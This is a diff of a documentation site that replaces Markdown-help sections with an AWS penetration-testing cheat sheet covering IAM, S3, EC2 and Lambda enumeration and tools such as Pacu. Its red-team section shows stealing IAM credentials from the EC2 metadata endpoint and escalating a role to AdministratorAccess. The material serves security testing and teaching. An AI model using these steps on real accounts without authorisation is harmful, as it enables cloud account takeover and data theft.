+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># List all IAM roles</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-roles<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># Get specific role details</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-role<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># List role policies</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-role-policies<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-role-policies<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="c1"># Get role trust policy (who can assume the role)</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-role<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--query<span class="w"> </span><span class="s1">&#39;Role.AssumeRolePolicyDocument&#39;</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
 </span></code></pre></div>
-<h2 id="escaping-characters">Escaping characters<a class="headerlink" href="#escaping-characters" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Use backslash to escape: \* \_ \# \`
+<h3 id="policy-analysis">Policy Analysis<a class="headerlink" href="#policy-analysis" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># List all policies</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-policies<span class="w"> </span>--scope<span class="w"> </span>Local<span class="w">  </span><span class="c1"># Customer-managed only</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-policies<span class="w"> </span>--scope<span class="w"> </span>AWS<span class="w">    </span><span class="c1"># AWS-managed only</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c1"># Get policy details and versions</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-policy<span class="w"> </span>--policy-arn<span class="w"> </span><span class="o">[</span>policy-arn<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-policy-versions<span class="w"> </span>--policy-arn<span class="w"> </span><span class="o">[</span>policy-arn<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="c1"># Get policy document</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span><span class="o">[</span>policy-arn<span class="o">]</span><span class="w"> </span>--version-id<span class="w"> </span><span class="o">[</span>version-id<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="c1"># Get inline policies</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-user-policy<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>user-name<span class="o">]</span><span class="w"> </span>--policy-name<span class="w"> </span><span class="o">[</span>policy-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-group-policy<span class="w"> </span>--group-name<span class="w"> </span><span class="o">[</span>group-name<span class="o">]</span><span class="w"> </span>--policy-name<span class="w"> </span><span class="o">[</span>policy-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-role-policy<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--policy-name<span class="w"> </span><span class="o">[</span>policy-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
 </span></code></pre></div>
-<h2 id="line-breaks">Line breaks<a class="headerlink" href="#line-breaks" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>End a line with two spaces  
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>to create a line break.
+<p><strong>🔍 POLICY TIP:</strong> To distinguish policy types:</p>
+<ul>
+<li><strong>Customer-Managed:</strong> <code>arn:aws:iam::123456789012:policy/YourPolicyName</code></li>
+<li><strong>AWS-Managed:</strong> <code>arn:aws:iam::aws:policy/AWSReadOnlyAccess</code></li>
+</ul>
+<h2 id="red-team-operations">Red Team Operations<a class="headerlink" href="#red-team-operations" title="Permanent link">&para;</a></h2>
+<h3 id="initial-compromise-enumeration">Initial Compromise &amp; Enumeration<a class="headerlink" href="#initial-compromise-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Configure compromised credentials</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>aws<span class="w"> </span>configure<span class="w"> </span>--profile<span class="w"> </span>compromised-user
 </span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>Or use a blank line for a new paragraph.
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># Basic service enumeration</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>aws<span class="w"> </span>ec2<span class="w"> </span>describe-instances<span class="w"> </span>--profile<span class="w"> </span>compromised-user
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>--profile<span class="w"> </span>compromised-user
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-users<span class="w"> </span>--profile<span class="w"> </span>compromised-user
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c1"># Regional enumeration (important for multi-region environments)</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>aws<span class="w"> </span>ec2<span class="w"> </span>describe-regions<span class="w"> </span>--profile<span class="w"> </span>compromised-user<span class="w"> </span>--query<span class="w"> </span><span class="s1">&#39;Regions[].RegionName&#39;</span><span class="w"> </span>--output<span class="w"> </span>text
 </span></code></pre></div>
+<h3 id="instance-metadata-exploitation">Instance Metadata Exploitation<a class="headerlink" href="#instance-metadata-exploitation" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Retrieve EC2 instance metadata (via SSRF/RCE)</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>curl<span class="w"> </span>http://169.254.169.254/latest/meta-data/iam/security-credentials/<span class="o">[</span>role-name<span class="o">]</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c1"># Get comprehensive instance data</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>curl<span class="w"> </span>http://169.254.169.254/latest/dynamic/instance-identity/document
+</span></code></pre></div>
+<p><strong>🎯 EXPLOITATION VECTORS:</strong> Cloud metadata can be accessed through:
+- <strong>SSRF</strong> (Server-Side Request Forgery)
+- <strong>RCE</strong> (Remote Code Execution)
+- <strong>XXE</strong> (XML External Entity)
+- Compromised application containers</p>
+<h3 id="credential-configuration-validation">Credential Configuration &amp; Validation<a class="headerlink" href="#credential-configuration-validation" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Configure temporary credentials from metadata</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_access_key_id<span class="w"> </span><span class="o">[</span>key-id<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>ec2-role
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_secret_access_key<span class="w"> </span><span class="o">[</span>secret-key<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>ec2-role
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_session_token<span class="w"> </span><span class="o">[</span>token<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>ec2-role
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="c1"># Verify the new identity</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w"> </span>--profile<span class="w"> </span>ec2-role
+</span></code></pre></div>
+<h3 id="privilege-escalation-techniques">Privilege Escalation Techniques<a class="headerlink" href="#privilege-escalation-techniques" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Check current role permissions</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-role-policies<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>compromised-user
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-role-policies<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>compromised-user
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="c1"># Get inline policy details</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-role-policy<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--policy-name<span class="w"> </span><span class="o">[</span>policy-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>compromised-user
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="c1"># Privilege escalation via policy attachment</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>aws<span class="w"> </span>iam<span class="w"> </span>attach-role-policy<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">    </span>--policy-arn<span class="w"> </span>arn:aws:iam::aws:policy/AdministratorAccess<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">    </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="w">    </span>--profile<span class="w"> </span>ec2-role
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="c1"># Verify escalated permissions</span>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-role-policies<span class="w"> </span>--role-name<span class="w"> </span><span class="o">[</span>role-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>compromised-user
+</span></code></pre></div>
+<h3 id="common-privilege-escalation-vectors">Common Privilege Escalation Vectors<a class="headerlink" href="#common-privilege-escalation-vectors" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>iam:AttachRolePolicy</strong> - Attach admin policy to existing role</li>
+<li><strong>iam:PutRolePolicy</strong> - Add inline policy to role</li>
+<li><strong>iam:CreateAccessKey</strong> - Create access key for other users</li>
+<li><strong>iam:PassRole</strong> + <strong>ec2:RunInstances</strong> - Pass role to new EC2 instance</li>
+<li><strong>lambda:CreateFunction</strong> + <strong>iam:PassRole</strong> - Create Lambda with privileged role</li>
+</ul>
+<h2 id="automated-tools">Automated Tools<a class="headerlink" href="#automated-tools" title="Permanent link">&para;</a></h2>
+<h3 id="pacu-aws-exploitation-framework">Pacu - AWS Exploitation Framework<a class="headerlink" href="#pacu-aws-exploitation-framework" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Start Pacu</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>pacu
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="c1"># Set credentials</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>set_keys
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="c1"># Follow prompts for alias, access key, secret key, session token</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="c1"># Basic reconnaissance</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>whoami
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="nb">exec</span><span class="w"> </span>iam__enum_permissions
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="nb">exec</span><span class="w"> </span>iam__privesc_scan
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="c1"># Service enumeration</span>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="nb">exec</span><span class="w"> </span>ec2__enum
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="nb">exec</span><span class="w"> </span>s3__enum
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="nb">exec</span><span class="w"> </span>lambda__enum
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="c1"># Check collected data</span>
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>data<span class="w"> </span>EC2
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>data<span class="w"> </span>IAM
+</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>data<span class="w"> </span>S3
+</span></code></pre></div>
+<h3 id="scoutsuite-multi-cloud-security-auditing">ScoutSuite - Multi-Cloud Security Auditing<a class="headerlink" href="#scoutsuite-multi-cloud-security-auditing" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Install ScoutSuite</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>pip<span class="w"> </span>install<span class="w"> </span>scoutsuite
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># Run against AWS environment</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>scout<span class="w"> </span>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="c1"># Generate HTML report</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>scout<span class="w"> </span>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span><span class="w"> </span>--report-dir<span class="w"> </span>./scout-report
+</span></code></pre></div>
+<h3 id="cloudbrute-cloud-storage-enumeration">CloudBrute - Cloud Storage Enumeration<a class="headerlink" href="#cloudbrute-cloud-storage-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Enumerate S3 buckets</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>cloudbrute<span class="w"> </span>-d<span class="w"> </span><span class="o">[</span>target-domain<span class="o">]</span><span class="w"> </span>-k<span class="w"> </span><span class="o">[</span>key-word<span class="o">]</span><span class="w"> </span>-m<span class="w"> </span>storage<span class="w"> </span>-t<span class="w"> </span><span class="m">50</span>
+</span></code></pre></div>
+<h3 id="s3scanner-s3-bucket-discovery">S3Scanner - S3 Bucket Discovery<a class="headerlink" href="#s3scanner-s3-bucket-discovery" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Find and scan S3 buckets</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>s3scanner<span class="w"> </span>scan<span class="w"> </span>--bucket-wordlists<span class="w"> </span>wordlists/buckets.txt
+</span></code></pre></div>
+<h2 id="additional-enumeration-commands">Additional Enumeration Commands<a class="headerlink" href="#additional-enumeration-commands" title="Permanent link">&para;</a></h2>
+<h3 id="s3-enumeration">S3 Enumeration<a class="headerlink" href="#s3-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># List all buckets</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c1"># Get bucket details</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>aws<span class="w"> </span>s3api<span class="w"> </span>list-buckets<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>aws<span class="w"> </span>s3api<span class="w"> </span>get-bucket-acl<span class="w"> </span>--bucket<span class="w"> </span><span class="o">[</span>bucket-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>aws<span class="w"> </span>s3api<span class="w"> </span>get-bucket-policy<span class="w"> </span>--bucket<span class="w"> </span><span class="o">[</span>bucket-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="c1"># Check for public access</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>aws<span class="w"> </span>s3api<span class="w"> </span>get-public-access-block<span class="w"> </span>--bucket<span class="w"> </span><span class="o">[</span>bucket-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span></code></pre></div>
+<h3 id="ec2-enumeration">EC2 Enumeration<a class="headerlink" href="#ec2-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># List instances across all regions</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="k">for</span><span class="w"> </span>region<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>aws<span class="w"> </span>ec2<span class="w"> </span>describe-regions<span class="w"> </span>--query<span class="w"> </span><span class="s1">&#39;Regions[].RegionName&#39;</span><span class="w"> </span>--output<span class="w"> </span>text<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;=== Region: </span><span class="nv">$region</span><span class="s2"> ===&quot;</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">    </span>aws<span class="w"> </span>ec2<span class="w"> </span>describe-instances<span class="w"> </span>--region<span class="w"> </span><span class="nv">$region</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="k">done</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c1"># Get security groups</span>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>aws<span class="w"> </span>ec2<span class="w"> </span>describe-security-groups<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span></code></pre></div>
+<h3 id="lambda-enumeration">Lambda Enumeration<a class="headerlink" href="#lambda-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># List Lambda functions</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>aws<span class="w"> </span>lambda<span class="w"> </span>list-functions<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
